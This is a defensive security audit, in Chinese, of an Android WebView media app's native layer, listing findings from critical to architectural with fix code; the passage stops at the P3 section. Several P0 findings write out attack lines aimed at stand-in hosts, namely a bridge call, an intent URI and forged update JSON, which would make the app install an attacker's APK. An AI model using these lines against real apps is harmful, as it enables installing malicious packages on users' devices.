# CinemaVault Android 原生层审计（01-native）

- 对象：`android/`（Java 单 Activity WebView 壳）+ 分发件 `CinemaVault-v4.5.6-Android.apk`
- 坐标：`4.5.6 / versionCode 3 / minSdk 24 / targetSdk 34 / compileSdk 34`（`android/app/build.gradle:13-14`）
- 方法：全量静态读码 + APK 静态分析（`build-tools/34.0.0` 的 aapt/apksigner + Python 解析 APK 条目）。设备未连接，无动态验证；凡"运行期推断"均已注明依据。
- 约束：只读审计，未修改 `android/` 下任何文件。边界：桥**契约**、手势细节、首屏性能归 `02-h5.md`，本文只写原生侧实现缺口与改法。

## 一、速览表

| 编号 | 级别 | 一句话 | 成本 |
|---|---|---|---|
| P0-1 | P0 | `shouldOverrideUrlLoading` 恒 `false` + 桥对所有 frame/任意 origin 生效 → 任何被导航到的站点（含页面内广告 iframe）都能调 `triggerUpdate` 装 APK | M |
| P0-2 | P0 | 导出 Activity 接受**任意 URL**（`http://` 甚至 `file://`）直灌 WebView，不用 JS 就拿到桥 | S |
| P0-3 | P0 | 更新元数据以**当前页面 origin** 为源（`:302-305`），任意页面返回 `{versionCode:99,apkUrl}` 即弹"发现新版本" → 装任意 APK | S |
| P0-4 | P0 | 下载/安装链路零校验：无 sha256、不比对签名证书、接口免鉴权、默认 http 明文 | M |
| P0-5 | P0 | `MIXED_CONTENT_ALWAYS_ALLOW` → https 反代页可被注入 http 脚本，同源即持桥 | S |
| P0-6 | P0 | 分发件 debug 签名 + `debuggable=true`：同包名可覆盖升级、adb 可读 WebView 私有数据 | M |
| P1-1 | P1 | 无 `onShowFileChooser` → 上传封面/壁纸/横幅/动效 4 处 `<input type=file>` 点开无反应 | M |
| P1-2 | P1 | 无 `onCreateWindow`/`setSupportMultipleWindows` → 17 处 `window.open` + 3 处 `_blank` 锚点静默失效 | S |
| P1-3 | P1 | 无 `RECORD_AUDIO` + 无 `onPermissionRequest` → `getUserMedia` 语音输入永久失败 | S |
| P1-4 | P1 | 无 `onRenderProcessGone` → 渲染进程被回收时整个 App 被带走 | S |
| P1-5 | P1 | 返回键 `evaluateJavascript` 全异步 → 双击退出实际要按三次、"退出提示"不显示 | S |
| P1-6 | P1 | 阅读器音量键**无条件** `return true` → 吞系统音量（`:574`） | S |
| P1-7 | P1 | PiP 无 `onPictureInPictureModeChanged`、`:348` 强横屏不恢复 → 进出 PiP 后黑屏/卡横屏 | M |
| P1-8 | P1 | 下载无续传、无前台服务、`ProgressDialog`（已废弃）、无通知 → 切后台大概率失败且无提示 | M |
| P1-9 | P1 | `pendingApkToInstall` 只在内存、任意 `onResume` 自动装、Activity 销毁后 `dismiss` 崩溃 | S |
| P1-10 | P1 | 无 `onSaveInstanceState`/`saveState`、`executor` 与 WebView 从不释放 → 进程死亡回首页、泄漏 | S |
| P1-11 | P1 | FileProvider 四个路径根全放开到目录 + `allowBackup=true` 无 `dataExtractionRules` | S |
| P1-12 | P1 | 版本号四处硬编码且互相矛盾（`4.5.4`/`4.5.5`/`4.5.6`），UA 与下载文件名写死 | S |
| P1-13 | P1 | 无 `signingConfig`，且 `android/` 整个模块**未入 git**（`git ls-files android/`=0） | M |
| P2-1 | P2 | 沉浸式用废弃 `setSystemUiVisibility`、零 WindowInsets → 顶栏被状态栏压住、IME 遮输入框（升 target 35 的阻断项） | M |
| P2-2 | P2 | 无 adaptive icon（缺 `mipmap-anydpi-v26`），xxxhdpi 单张 452KB | S |
| P2-3 | P2 | 无 SplashScreen、无 `values-night`；DayNight 主题 + 全硬编码深色 → 浅色系统下 Material 组件变白 | S |
| P2-4 | P2 | 无状态栏/导航栏图标明暗切换 → 白底页面白图标 | S |
| P2-5 | P2 | `FLAG_KEEP_SCREEN_ON` 无条件常亮；未处理 `textZoom` → 系统字体放大无效 | S |
| P2-6 | P2 | TalkBack：44dp 触摸目标、`contentDescription` 硬编码中文、无 `strings.xml` 抽取 | M |
| P2-7 | P2 | 非 APK 下载甩外部浏览器（丢会话→403）；无 MediaSession/通知 → 后台朗读无控制 | M |
| P2-8 | P2 | 长按返回改地址的隐藏入口在 Android 11+ 不可达；`getScrollY()` 判下拉刷新恒为真 | S |
| P2-9 | P2 | 平板/折叠屏与 TV/D-pad 均未适配（无 `values-sw600dp`、`onConfigurationChanged` 未实现） | M |
| P2-10 | P2 | 无 `onReceivedSslError` 定制提示、无 `onConsoleMessage` → 自签证书无引导、白屏无法定位 | S |
| P3-1 | P3 | 桥应改为 `WebViewCompat.addWebMessageListener` + origin 白名单 | L |
| P3-2 | P3 | 843 行 God Activity 应拆 UpdateManager/BridgeHost/Immersive/WebViewHost | L |
| P3-3 | P3 | 无 CI、无版本自增、无签名流水线（`android/` 甚至没进 git） | M |
| P3-4 | P3 | 无 R8/资源压缩，dex 9.81MB 含零源码的 kotlin-stdlib 与 coroutines | M |
| P3-5 | P3 | 无 baseline profile / 启动优化，WebView 冷启动首屏 | M |
| P3-6 | P3 | `cinemavault://` 只是字符串拼接无路由表；单服务器 profile 无多地址模型 | S |
| P3-7 | P3 | 分发应走 HTTPS 域名 + 证书固定 + 分发页公示 sha256 | M |

> 成本口径：S ≤ 半天、M ≈ 1-3 天、L ≥ 1 周（含验证）。

## 二、P0 阻断 / 安全

### P0-1 任意站点可把 WebView 导航走，桥随页面持续暴露

- **证据**：`MainActivity.java:272-275` `shouldOverrideUrlLoading` 直接 `return false;`；`:265` `addJavascriptInterface(new AndroidBridge(), "AndroidBridge")`；`:144-147` `triggerUpdate(String downloadUrl, String versionName)` → `downloadAndInstallApk`；`:371` DownloadListener 里 `url.contains(".apk")` 也直装。而 `server.js:148` 把第三方站点整站反代（`app.use('/', webviewProxy)`），H5 又大量嵌 iframe 播放源/广告。
- **根因**：`@JavascriptInterface` 注入是 **per-WebView** 而非 per-origin；返回 `false` 等于把"这个 WebView 装载哪个 origin"的决定权交给页面内容，桥方法自身又无任何来源校验。
- **影响**：一次导航（用户点广告、或反代页里第三方注入的 `location.href`）后，攻击者页面执行 `AndroidBridge.triggerUpdate('http://attacker/x.apk','9.9.9')` 即可走完安装链 → **远程任意 APK 安装**。
- **修复**（三层）：
  ```java
  @Override public boolean shouldOverrideUrlLoading(WebView v, WebResourceRequest req) {
      Uri u = req.getUrl();
      if (isTrusted(u)) return false;                   // 仅自家 host / cinemavault://
      startActivity(new Intent(Intent.ACTION_VIEW, u)); // 外部域名甩系统浏览器
      return true;
  }
  ```
  桥内每个 `@JavascriptInterface` 入口先 `if (!isTrusted(Uri.parse(webView.getUrl()))) return;`；并把"装包"从桥里彻底移除（见 P3-1），桥只保留只读能力，安装只由原生主动触发。
- **工作量**：M（含一次全站 iframe/外链回归）

### P0-2 导出 Activity 接受任意 URL，绕过 JS 就拿到桥

- **证据**：`MainActivity.java:177-188`（`onCreate`）与 `:200-209`（`onNewIntent`）同一份逻辑：`if (uriStr.startsWith("cinemavault://")) {...loadServerUrl(base+path);} else { loadServerUrl(uriStr); }`；`AndroidManifest.xml:29` `android:exported="true"`，`:39-44` 只有 `scheme="cinemavault"` 的 filter，但**代码不看 scheme 就认任何 URI**。
- **根因**：`getIntent().getData()` 无 scheme/host 白名单，`else` 分支等于一个"任意 URL 加载器"。
- **影响**：任意 App 或网页里一个 `intent://...#Intent;component=cn.cinemavault.app/.MainActivity;S.data=http://evil;end` 即可把 App 拉起到攻击者页面，此时桥已就绪（`:265` 在 `onCreate` 早期完成），**无需任何用户导航**即可调桥；`file://` 分支还能在 `setAllowFileAccess(true)`（`:250`）下读本地文件。
- **修复**：只接受 `cinemavault://` 且走路由表，其余 scheme 丢弃并提示；`file/content` 一律拒绝。
- **工作量**：S

### P0-3 更新元数据信任「当前页面 origin」，纯原生伪造"发现新版本"

- **证据**：`MainActivity.java:302-305` `checkAppUpdateInBackground(currentLoadingUrl)` 用的是**当前页面 URL**；`:677` `apkUrl.startsWith("http") ? apkUrl : (base + apkUrl)` 接受绝对地址；`:676` 只要 `remoteVersionCode > currentVersionCode`。
- **根因**：信任锚点应是 `prefs` 里保存的服务器地址，这里却取自"任意页面加载完成时的 URL"。
- **影响**：任何页面（含被 P0-1 带过去的站点）返回 `{"versionCode":99,"apkUrl":"http://evil/a.apk"}` 即触发原生更新弹窗 → **纯 HTML 响应就能装包**，不需要 JS、不需要桥。比 P0-1 更隐蔽。
- **修复**：`String base = prefs.getString(KEY_SERVER_URL, "")`，且 `isTrusted(Uri.parse(base))` 才请求；响应必须带 `sha256`+`signerSha256`（P0-4）。服务端 `/api/app/android-version` 增加这两个字段。
- **工作量**：S

### P0-4 下载与安装链路零校验

- **证据**：`MainActivity.java:700-766`：`:724-727` `HttpURLConnection` 直连（**无 Range/续传/重试**），`:734-751` 4KB 循环写盘后直接 `installApk(finalApk)`（`:753-756`），**全程无 digest、无签名比对、无版本复核**。`routes/app-update.js:63-83` 响应只有 `version/versionCode/apkUrl/fileName/fileSize/changelog`，**无 sha256**；`:86-98` 下载仅 `createReadStream().pipe(res)`，无 `Range`/`ETag`。`server.js:45` `PUBLIC_API_PREFIXES` 含 `/app` → 两接口在开密码保护后仍**免鉴权**。`network_security_config.xml:3` 全域 cleartext + `AndroidManifest.xml:24` `usesCleartextTraffic="true"`。
- **根因**：把"网页里点更新"当可信通道，缺服务端签发的完整性与来源证明。
- **影响**：局域网/热点中间人（ARP 投毒、恶意 AP）可替换 APK 为任意 payload；叠加 P0-1/P0-3 构成完整链的终点。
- **修复**：
  ```java
  String actual = sha256(outFile);                       // MessageDigest
  if (!actual.equalsIgnoreCase(expectedSha256)) { outFile.delete(); toast("校验失败"); return; }
  if (!BUNDLED_CERT_SHA256.equals(apkSignerSha256(outFile))) { outFile.delete(); return; }
  installApk(outFile);
  ```
  `apkSignerSha256` 用 `GET_SIGNING_CERTIFICATES`(API 28+)/`GET_SIGNATURES` + `getPackageArchiveInfo` 取证书再 SHA-256，**与自身证书比对**才能防服务端被拿下后换包。服务端侧：hash 在构建时算好缓存；下载路由支持 `Range`（`createReadStream(path,{start,end})`+206）；`/app` 从免鉴权前缀移除。
- **工作量**：M

### P0-5 `MIXED_CONTENT_ALWAYS_ALLOW`：https 页面可被注入 http 脚本

- **证据**：`MainActivity.java:258` `setMixedContentMode(MIXED_CONTENT_ALWAYS_ALLOW)`；`:250` `setAllowFileAccess(true)`。
- **根因**：为兼容局域网 http 服务端与 http 播放源而全面放开。服务端对外是 https（Cloudflare/穿透反代）时，页面里的 `<script src="http://...">` 会被加载且**与页面同源**。
- **影响**：公共 WiFi/恶意热点即可注入脚本 → 直接调桥，**不需要装 CA**，与 P0-1/P0-4 组成完整链。
- **修复**：debug 用 `MIXED_CONTENT_COMPATIBILITY_MODE`（只放行 image/media），release 用 `NEVER_ALLOW`；`setAllowFileAccess(false)`/`setAllowContentAccess(false)`；若局域网必须 http，按 `loadServerUrl` 的 scheme 分流。
- **工作量**：S

### P0-6 分发件是 debug 签名 + `debuggable=true`

- **证据**：`apksigner verify --print-certs` → `Signer#1 DN: C=US, O=Android, CN=Android Debug`，`v2=true/v1=false/v3=false`；`aapt dump xmltree` → `debuggable=true`；`android/app/build.gradle:19-24` release 块**无 signingConfig**；仓库内无任何 keystore；分发件 SHA256 与 `android/app/build/outputs/apk/debug/app-debug.apk` 同为 `e885d528…5ef8`（6,907,262B）。
- **根因**：一直用 `assembleDebug` 产物发布。
- **影响**：① debug key 是公开的（每台装了 SDK 的机器都有），可签**同包名、可覆盖升级**的 APK，用户点"更新"即被替换且不报签名冲突；② `debuggable=true` 使同机 adb/root 可 `run-as cn.cinemavault.app` 读 WebView Cookie 与 `config.json` 里的口令；③ 商店/自动化分发均不接受 debug 签名。
- **修复**：`signingConfigs.release`（口令走 `local.properties`/CI secret）+ `buildTypes.release { signingConfig ...; minifyEnabled true; shrinkResources true }`；manifest 不写死 `debuggable`。
- **工作量**：M

## 三、P1 稳定性与功能缺陷

### P1-1 无 `onShowFileChooser` → 所有文件上传按钮失效

- **证据**：`MainActivity.java:330-356` 的 `WebChromeClient` 只覆写 `onShowCustomView`/`onHideCustomView`。H5 侧 `<input type="file">`：`public/library.html:677`（上传封面）、`public/js/app.js:7610`（壁纸）、`:7622`（横幅）、`:7651`（动效）。
- **根因**：WebView 不会自己开系统选择器，必须宿主实现 `onShowFileChooser` 回灌 `ValueCallback<Uri[]>`。
- **影响**：点"上传封面/选壁纸"**无反应也无报错**（input click 被吞），用户以为功能坏了；浏览器正常、只有 APK 坏，极易被误判成后端问题。
- **修复**：
  ```java
  @Override public boolean onShowFileChooser(WebView v, ValueCallback<Uri[]> cb, FileChooserParams p) {
      if (filePathCallback != null) filePathCallback.onReceiveValue(null);
      filePathCallback = cb;
      Intent i = p.createIntent(); i.addCategory(Intent.CATEGORY_OPENABLE);
      try { filePickerLauncher.launch(i); } catch (Exception e) { filePathCallback = null; return false; }
      return true;
  }
  ```
  配 `registerForActivityResult(StartActivityForResult)`，在回调里解析 `ClipData`/`getData()` 后 `onReceiveValue`；服务端取文件名要用 `OpenableColumns.DISPLAY_NAME`（`content://` 无文件名）。
- **工作量**：M（含前后端联调）

### P1-2 无 `onCreateWindow` → popup 全部静默丢弃

- **证据**：`MainActivity.java:244-381` 未 `setSupportMultipleWindows(true)`、无 `onCreateWindow`。H5 侧 `window.open(` 共 **17 处**（显式 `'_blank'` 10 处：`app.js:4246/4304/5272/7441/16844`、`features.js:1580/1958`、`home.js:481`、`media-source.js:229`、`app.js:6187`），`target="_blank"` 锚点 3 处（`app.js:8936`、`features.js:2053`、`tts-panel.js:437`）；典型用途：云盘 OAuth 授权（`app.js:4913`）、外部资源站跳转（`app.js:5501/5594`）。
- **根因**：未覆写 `onCreateWindow` 时 WebView 直接丢弃弹窗请求，不报错。
- **影响**：云盘授权链在 APK 里点了没反应，外部链接同样静默失败。
- **修复**：`setSupportMultipleWindows(true)` + `onCreateWindow` 里用临时 WebView + `WebViewTransport` 取回首个 URL，自家源回主 WebView、外部源 `Intent.ACTION_VIEW`，然后 `tmp.destroy()`。
- **工作量**：S

### P1-3 无录音权限、无 `onPermissionRequest` → 语音输入永久失败

- **证据**：`AndroidManifest.xml:6-14` 无 `RECORD_AUDIO`；`MainActivity` 无 `onPermissionRequest`；H5：`public/js/app.js:10038-10041` `getUserMedia({audio:true})`。
- **影响**：`testMicPermission()` 永远抛 `NotAllowedError`，语音输入对 APK 用户形同不存在。
- **修复**：manifest 加权限；`onPermissionRequest` 里先 `ActivityResultLauncher(RequestPermission)` 申请，成功再 `request.grant(request.getResources())`。
- **工作量**：S

### P1-4 无 `onRenderProcessGone` → 渲染进程回收直杀 App

- **证据**：grep 计数 0。
- **根因**：WebView 多进程渲染器在低内存/长时间后台被系统 kill，未覆写时 Activity 连带终止。
- **影响**：看长视频/读小说切后台回来 App 直接消失（观感=闪退），叠加 P1-10 回首页。
- **修复**：`onRenderProcessGone` 里 `rootContainer.removeView(webView); webView.destroy();` 后 `recreate()` 并恢复 URL，**返回 true** 避免进程崩溃。
- **工作量**：S

### P1-5 返回键全异步：双击退出实际三次、提示不显示

- **证据**：`MainActivity.java:518-535`：`evaluateJavascript(checkModalJs, result -> { ... if (canGoBack()) goBack(); else { if (now-lastBackPressTime<2000) finish(); else { lastBackPressTime=now; Toast(...); } } })`。
- **根因**：JS 探测异步，`lastBackPressTime` 判定被推迟到回调；用户第二次按键时第一次的 toast 还没弹出。
- **影响**：要按 3 次才退出、提示与实际按键错位，用户以为返回键失灵。
- **修复**：遮罩状态改同步（H5 在开/关时经桥上报布尔，原生缓存），`handleOnBackPressed()` 全同步判定；加 `android:enableOnBackInvokedCallback="true"` 迁移到 `OnBackInvokedCallback` 以适配 predictive back。
- **工作量**：S

### P1-6 阅读器里音量键无条件 `return true`

- **证据**：`MainActivity.java:545-574`：`if (KEYCODE_VOLUME_DOWN || VOLUME_UP) { boolean isDirectReader = url != null && (url.contains("reader.html")||url.contains("comic")||url.contains("novel")); if (isInReaderMode || isDirectReader) { ...evaluateJavascript(翻页JS...); ... } return true; }` —— `return true` 在回调之外**无条件执行**。
- **根因**：`dispatchKeyEvent` 必须同步返回，作者用"先拦截、后异步判断"，等于永久把音量键交给页面。
- **影响**：任何命中 `comic|novel` 子串的页面（含**漫画书架页/小说详情页**）音量键都被吞，用户无法调音量，只能退出重进；翻页脚本报错时同样吞键无回退。
- **修复**：桥上报 `setCanPageTurn(boolean)` 做同步判定；拦截失败时 `return super.dispatchKeyEvent(event)`；更好的做法是 H5 侧 `keydown` 自己翻页，原生不碰音量键。
- **工作量**：S

### P1-7 PiP：无生命周期回调、强横屏不恢复

- **证据**：`MainActivity.java:581-593` 只有 `onUserLeaveHint()` → `enterPictureInPictureMode(params)`；**无 `onPictureInPictureModeChanged`**；`:348` `onShowCustomView` 里 `SCREEN_ORIENTATION_SENSOR_LANDSCAPE`，只有 `:397`（`onHideCustomViewInternal`）才恢复 `SCREEN_ORIENTATION_USER`。
- **根因**：PiP 进出没有状态机：小窗仍被锁横屏；用户点 PiP 的 × 退出时若页面未触发 `exitFullscreen`，`onHideCustomViewInternal` 不执行 → 方向锁与 `customVideoView != null` 状态残留。
- **影响**：PiP 窗口比例怪异甚至黑屏（Surface 重建）；回到全屏后 App 卡横屏，且 `:473` 因 `customVideoView != null` 让返回键先去关全屏。
- **修复**：`onPictureInPictureModeChanged` 里管制 UI 并在退出时 `onHideCustomViewInternal()` + 恢复方向；`setPictureInPictureParams(new Builder().setAspectRatio(videoAspect).setAutoEnterEnabled(true).build())` 动态更新比例。
- **工作量**：M

### P1-8 下载链路工程缺陷：无续传 / 无前台服务 / 废弃对话框

- **证据**：`MainActivity.java:701-708` `new ProgressDialog(this)`（API 26 起 `@Deprecated`）；`:724-727` 无 `Range`、无重试；`:742-745` 每 4KB post 一次进度；全文件无 Service/Notification；`:753-756` 主线程 `dismiss()`（Activity 已 finish 则 `BadTokenException`）；`:710` lambda 捕获 `this`。
- **影响**：切后台/息屏后连接被冻结 → 进度停在 37%、无提示；用户只会反复点。
- **修复**：迁 `WorkManager`（或前台 Service + `FOREGROUND_SERVICE_DATA_SYNC`）：`setRequestProperty("Range","bytes="+done+"-")` 续传、指数退避、通知栏进度、完成通知点击安装；删掉 `ProgressDialog`。
- **工作量**：M

### P1-9 `pendingApkToInstall` 状态机是坏的

- **证据**：`MainActivity.java:88` 内存字段；`:218-226` `onResume` 里只要非空且已有权限就 `installApk`；`:786`/`:788` 存/清；无持久化。
- **影响**：① 从设置页返回自动弹安装器，无法取消；② 切别的 App 再回来突然弹安装器；③ 在设置页**拒绝**后每次进入都重弹"需要权限"（`canRequestPackageInstalls()` 仍 false）；④ 进程被杀后已下好的 APK 成孤儿（无清理逻辑）。
- **修复**：用 `ActivityResultLauncher(StartActivityForResult)` 包住 `ACTION_MANAGE_UNKNOWN_APP_SOURCES`（有返回）在回调里判定，不在 `onResume` 嗅状态；pending 路径写入 SharedPreferences 并在 `onCreate` **显式询问**；安装前校验 hash/签名；启动时清理过期 APK。
- **工作量**：S

### P1-10 无状态保存、无资源释放

- **证据**：无 `onSaveInstanceState`、无 `onDestroy`、无 `webView.destroy()`、无 `executor.shutdown()`（grep 均 0）；`:84` `Executors.newSingleThreadExecutor()` 为 final 字段。
- **影响**：① 进程死亡或 `configChanges` 未覆盖的配置变化（fontScale/uiMode/density/locale）后回首页，阅读进度丢失；② WebView 持有 Activity 造成泄漏，反复创建时多实例并存；③ 线程池随 Activity 泄漏。
- **修复**：`onSaveInstanceState` 里 `webView.saveState(out)` + `onCreate` 里 `restoreState`；`onDestroy` 里 `executor.shutdownNow()`、`removeView` + `stopLoading` + `loadUrl("about:blank")` + `setWebChromeClient(null)` + `destroy()`。
- **工作量**：S

### P1-11 FileProvider 路径过宽 + 备份无限制

- **证据**：`res/xml/file_paths.xml:3-6` `external-cache-path/cache-path/external-files-path/files-path` 全部 `path="."`；`android:grantUriPermissions="true"`（`AndroidManifest.xml:48-56`）。`AndroidManifest.xml:17` `allowBackup="true"` 且无 `dataExtractionRules`/`fullBackupContent`（aapt xmltree 亦确认）。
- **影响**：任何持有 `content://…fileprovider/...` 授权者可遍历这些目录根；备份把 WebView Cookie 与 `CinemaVaultPrefs`（服务器地址，未来若存口令则含口令）带上云/`adb backup`。
- **修复**：只暴露 `<external-files-path name="apk" path="Download/"/>`；`allowBackup="false"`（媒体库客户端无需备份），或 `dataExtractionRules` 显式排除 `sharedpref`/`database` 域。
- **工作量**：S

### P1-12 版本号四处硬编码、互相矛盾

- **证据**：`build.gradle:14 "4.5.6"`；`MainActivity.java:140` 兜底 `"4.5.4"`；`:262` UA `" CinemaVault-Android/4.5.6"`；`:666` changelog 默认 `"4.5.5"`；`:372` 下载名 `"4.5.6"`；`routes/app-update.js:59` 兜底 `{versionCode:3, versionName:'4.5.6'}`。
- **影响**：① H5 靠 UA 里的版本判断客户端（`mobile-updater.js:11`），UA 忘改则更新提示错位；② 下载文件名与实际版本不符，手机里堆同名 update 包；③ 服务端正则读 build.gradle，格式一变就静默回落到 `3`，更新永不触发。
- **修复**：`buildConfigField "String","UA_SUFFIX","\"CinemaVault-Android/${versionName}\""`，Java 全部引用 `BuildConfig.VERSION_NAME`/`UA_SUFFIX`；服务端读不到应**报错而非兜底**。
- **工作量**：S

### P1-13 无签名 release 构建，且 `android/` 整个模块未进版本库

- **证据**：`git ls-files android/` → **0 条**；`git status --porcelain android/` → `?? android/`（仓库共跟踪 16,357 文件，`.gitignore` 里也没有 `android/`，纯属从未 `git add`）。`android/app/build.gradle:19-24` release 块无 `signingConfig`；仓库与 `.github/workflows` 均无 Android 构建。
- **影响**：① 原生层没有历史、没有 diff、没有回滚，本次每条问题只能靠人肉记住；② 改坏了无法 `git checkout`；③ 无法代码评审；④ 换机即失。
- **修复**：`git add android/`（先加 `.gitignore`：`*/build/`、`.gradle/`、`local.properties`）；建 release keystore（口令走 CI secret）；加 CI：`assembleRelease lint` + `apksigner verify --print-certs` 断言证书指纹。
- **工作量**：M

## 四、P2 体验与兼容

### P2-1 沉浸式 API 全废弃 + 零 insets（升 target 35 的阻断项）

- **证据**：`MainActivity.java:165-168`（`setSystemUiVisibility(LAYOUT_STABLE|LAYOUT_FULLSCREEN)`）、`:827-842`（`IMMERSIVE_STICKY|HIDE_NAVIGATION|FULLSCREEN`/`VISIBLE`）；`activity_main.xml:24-27` 齿轮按钮 `marginBottom="84dp"`；全文件无 `WindowInsets`/`setDecorFitsSystemWindows`/`WindowInsetsControllerCompat`（grep 0）。
- **根因**：API 30 起 `setSystemUiVisibility` 逐项废弃，正路是 `WindowCompat.setDecorFitsSystemWindows(false)` + `WindowInsetsControllerCompat`；从未处理 insets，靠 `LAYOUT_FULLSCREEN` 硬顶、靠写死 84dp 躲导航栏。
- **影响**：① target 34 在 Android 15/16 上**暂不被强制** edge-to-edge（强制针对 target≥35），今天还能显示；② 一旦升 35（商店要求/想用新 API），网页顶栏被状态栏压、底部 tab 被手势条压、`input` 被 IME 遮 → **升级即崩版**；③ 84dp 在 3 键/手势/平板下位置全错。
- **修复**：
  ```java
  WindowCompat.setDecorFitsSystemWindows(getWindow(), false);
  ViewCompat.setOnApplyWindowInsetsListener(rootContainer, (v, insets) -> {
      Insets b = insets.getInsets(WindowInsetsCompat.Type.systemBars()|WindowInsetsCompat.Type.displayCutout());
      Insets ime = insets.getInsets(WindowInsetsCompat.Type.ime());
      webView.setPadding(b.left, b.top, b.right, Math.max(b.bottom, ime.bottom)); return insets; });
  ```
  齿轮按钮改 `translationY = -insets.bottom`；H5 侧配合 `viewport-fit=cover` + `env(safe-area-inset-*)`。
- **工作量**：M

### P2-2 无 adaptive icon，单张 452KB

- **证据**：APK 内仅 `res/mipmap-{m,h,x,xx,xxx}hdpi-v4/ic_launcher(_round).png`，**无 `mipmap-anydpi-v26/`**；xxxhdpi 512×512 各 452,399B（两张 904KB），10 个 PNG 合计约 1.2MB（占未压缩总量 9.5%）。
- **影响**：Android 8+ 桌面把图标裁圆/裁方并加白底，与深色品牌割裂；1.2MB 对 6.9MB 包显著冗余。
- **修复**：加 `mipmap-anydpi-v26/ic_launcher.xml`（`<adaptive-icon>` 背景 `@color/bg_dark` + 前景 vector）；PNG 只留一份 xxhdpi（约 120KB）。
- **工作量**：S

### P2-3 无 SplashScreen、无 `values-night`

- **证据**：`themes.xml:3` 父主题 `Theme.MaterialComponents.DayNight.NoActionBar`，但 `colors.xml` 6 色全为深色常量，`values-night/` 不存在；无 `windowSplashScreenBackground`/`postSplashScreenTheme`。
- **影响**：系统浅色模式下 `DayNight` 把 `AlertDialog`/`EditText` 渲染成浅色，与 `bg_dark` 的 WebView 割裂；冷启动走默认 SplashScreen（app icon + 浅色底），与深色首屏闪一下。
- **修复**：固定 `Theme.MaterialComponents.NoActionBar`（本应用深色优先）；加 `windowSplashScreenBackground=@color/bg_dark` + 图标。
- **工作量**：S

### P2-4 系统栏图标明暗不切换

- **证据**：全文件无 `SYSTEM_UI_FLAG_LIGHT_STATUS_BAR`/`LIGHT_NAVIGATION_BAR`（grep 0），状态栏/导航栏恒透明（`:163-164`）。
- **影响**：H5 有白底页面（阅读器、小说正文）时状态栏图标仍为白色 → **白底白字**，时间/电量不可见。
- **修复**：桥上报 `setLightBars(boolean)`，原生用 `WindowInsetsControllerCompat.setAppearanceLightStatusBars/NavigationBars` 切换；进阅读器置 true。
- **工作量**：S

### P2-5 常亮无节制 + 未处理字体缩放

- **证据**：`MainActivity.java:156` `FLAG_KEEP_SCREEN_ON` 在 `onCreate` 无条件加；无 `setTextZoom`/`TEXT_AUTOSIZING`（grep 0）。
- **影响**：设置页/书架页放着不管永不熄屏（耗电、用户困惑"屏幕关不掉"）；系统字体调大后 H5 文字不变（WebView 不跟随 `fontScale`），老年用户诉求失效。
- **修复**：仅播放/朗读时加 flag 或交给 H5 `setKeepScreenOn`；`onConfigurationChanged`/启动时 `setTextZoom((int)(100*fontScale))`，或 H5 用 `--font-scale` 变量（需与 02-h5 协同）。
- **工作量**：S

### P2-6 无障碍（TalkBack）不足

- **证据**：`activity_main.xml:26-35` 齿轮按钮 44dp×44dp、`contentDescription="切换服务器地址"` 硬编码、`src="@android:drawable/ic_menu_preferences"`（框架废弃图标）；`strings.xml` 仅 7 条，Java 里大量硬编码中文（"正在下载更新包"/"需要安装权限"/"请稍候..."）。
- **影响**：触摸目标低于 48dp 建议；无 i18n 能力；`setupOverlay` 显示时 WebView 仍可被聚焦朗读。
- **修复**：触摸目标 48dp；文案抽 `strings.xml`；overlay 显示时 `webView.setImportantForAccessibility(NO_HIDE_DESCENDANTS)`；给 WebView 加 `contentDescription`。
- **工作量**：M

### P2-7 无下载管理、无 MediaSession

- **证据**：`MainActivity.java:374-378` 非 APK 下载 → `Intent.ACTION_VIEW` 甩外部浏览器（丢 Cookie → 后端 403）；全文件无 `MediaSession`/`Notification`（grep 0）。
- **影响**：云盘"下载到手机"在 APK 里必然 403；听书/朗读切后台无通知栏控制，锁屏不能暂停。
- **修复**：非 APK 链接走 `DownloadManager.Request`（带 `Cookie` header）或自家下载任务；播放场景接 `MediaSessionCompat` + `MediaStyle` 通知（H5 经桥同步播放状态）。
- **工作量**：M

### P2-8 隐藏入口失效 + 下拉刷新判定恒为真

- **证据**：`MainActivity.java:818-825` `onKeyLongPress(BACK)` → `promptChangeServer()`，但 `dispatchKeyEvent` 里未 `event.startTracking()`；`:359-367` `swipeRefresh.setEnabled(webView.getScrollY() <= 0)`，而 WebView 内容滚动不改 `View.getScrollY()`（恒 0）。
- **影响**：① Android 11+ 上长按返回不产生长按事件 → "改服务器地址"隐藏入口不可达，连错地址只能清数据/重装；② 任何页面下拉都触发整页 `reload()`（`:436-439`），阅读器误触即丢进度。
- **修复**：`ACTION_DOWN` 里对 BACK `startTracking()`，并在设置页提供显式入口；下拉刷新改由 H5 上报 `setAtTop(boolean)`，或移除 SwipeRefresh 改页面内"回到顶部"。
- **工作量**：S

### P2-9 平板/折叠屏与 TV/D-pad 均未适配

- **证据**：`res/` 只有 `layout/`（无 `layout-sw600dp`/`values-sw600dp`）；`AndroidManifest.xml:31` 手写 `configChanges` 但类中**无 `onConfigurationChanged`**（grep 0）；manifest 无 `LEANBACK_LAUNCHER`、无 `uses-feature touchscreen required=false`。
- **影响**：平板上 H5 侧栏与内容挤压；折叠屏展开/折叠时因 `configChanges` 吞掉重建又未手动处理而出现空白带；TV/盒子明确不可用（对"NAS 家庭影院"场景是功能缺失）。
- **修复**：实现 `onConfigurationChanged` 里 `requestLayout()` 并按宽度通知 H5；补 `layout-sw600dp` 限制覆盖层宽度。TV 支持需 leanback launcher + WebView `setFocusable(true)` + H5 D-pad 导航（L）。
- **工作量**：M

### P2-10 无 SSL 错误定制、无 JS 错误通道

- **证据**：`onReceivedSslError`/`onConsoleMessage` grep 均 0；`errorOverlay` 只在 `:313-318` 处理 502/503/504（`:321-327` 处理通用 `onReceivedError`）。
- **影响**：自签 HTTPS 用户只看到 `net::ERR_CERT_AUTHORITY_INVALID` 通用页，不知道要装 CA；APK 内白屏只能靠 `chrome://inspect`（需连电脑），线上问题无法定位。
- **修复**：`onReceivedSslError` 里 `handler.cancel()` + 定制文案（**不要** `proceed()`）；`onConsoleMessage` 收 `ERROR` + 注入 `window.onerror` → 桥 `logError(String)` → 写 `getFilesDir()/webview-error.log` 或上报。
- **工作量**：S

## 五、P3 长期架构

### P3-1 桥的长期形态：`@JavascriptInterface` → `postWebMessage` + origin 白名单

- **现状**：`MainActivity.java:91-148` 一个内部类 5 个方法，同步阻塞、无来源校验、无速率限制，且对每个 frame 生效。
